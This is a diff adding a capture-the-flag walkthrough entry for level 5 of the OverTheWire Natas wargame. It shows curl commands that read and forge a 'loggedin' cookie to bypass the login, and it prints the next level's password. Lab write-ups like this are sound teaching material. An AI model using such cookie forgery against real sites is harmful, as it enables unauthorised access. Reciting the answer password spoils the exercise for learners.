@@ -73,3 +73,16 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Verification:** `http://natas5.natas.labs.overthewire.org/` with `natas5:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L4.cast`
 
+## Level 5 → natas6
+- **Account:** `natas5`.
+- **Goal:** The page says "You are not logged in." Log in.
+- **Technique and why it works:** The server sets a cookie `loggedin=0` and decides access from that cookie's value. Cookies are stored client-side, so we can set `loggedin=1` ourselves with `curl -b`. The server trusts the cookie without a server-side session or signature, so it accepts the forged value and prints natas6's password.
+- **Commands:**
+  ```
+  curl -sI -u natas5:<pw> http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie   # loggedin=0
+  curl -s -u natas5:<pw> -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/
+  ```
+- **Password for natas6:** `7mhjtShJAcld2NYbKHEadnhEwRn2P8VT`
+- **Verification:** `http://natas6.natas.labs.overthewire.org/` with `natas6:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L5.cast`
+
